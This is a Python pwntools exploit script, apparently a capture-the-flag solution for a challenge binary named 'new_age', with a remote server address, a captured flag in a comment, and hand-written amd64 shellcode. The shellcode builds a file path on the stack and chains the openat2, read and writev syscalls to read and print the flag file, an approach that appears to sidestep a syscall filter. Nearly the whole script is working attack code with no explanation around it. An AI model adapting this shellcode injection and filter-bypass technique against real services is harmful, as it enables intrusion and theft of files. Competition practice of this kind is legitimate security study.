#!/usr/bin/python3
from pwn import * 

exe = ELF('./new_age', checksec=False)
#libc = ELF('./libc', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x0000000000001544
		c
		''')

if args.REMOTE:
	HOST = '159.89.106.147'
	PORT = 1337
	p = remote(HOST, PORT)
else:
	p = process(exe.path)
#GDB()
# ./flag_n
# ame_Shou
# ld_Be_R@
# ndom_aha
# hahahaha
# hahahah.
# txt\0\0\0\0\0
input()
pld = asm('''
	push 0
	push 0
	push 0
	mov rdx, rsp
	mov rax, 437
	mov rdi, -100
	mov rbx, 7633012
	push rbx 
	mov rbx, 3344029824261316968
	push rbx
	mov rbx, 7018967120195641704
	push rbx
	mov rbx, 7018967081742722158
	push rbx
	mov rbx, 4634871855027545196
	push rbx
	mov rbx, 8462096932144508257
	push rbx
	mov rbx, 7953189135087709998
	push rbx
	mov rsi, rsp
	mov r10, 24
	syscall

	mov rdi, rax
	xor rax, rax
	mov rsi, rsp
	mov rdx, 0x100
	syscall

	mov rax, 20
	mov rdi, 1
	mov rbx, rsi
	push 0x100
	push rbx 
	mov rsi, rsp
	mov rdx, 1
	syscall
	''', arch='amd64')
sa(b'(max 4096 bytes): \n', pld)
p.interactive()
# Openat2 -> read -> writev
# 0xL4ugh{D0n'tF000rgoot_k33p_up_Ieesss_withhhh_n3w_5y5c4llsssss5s5s5sss}	

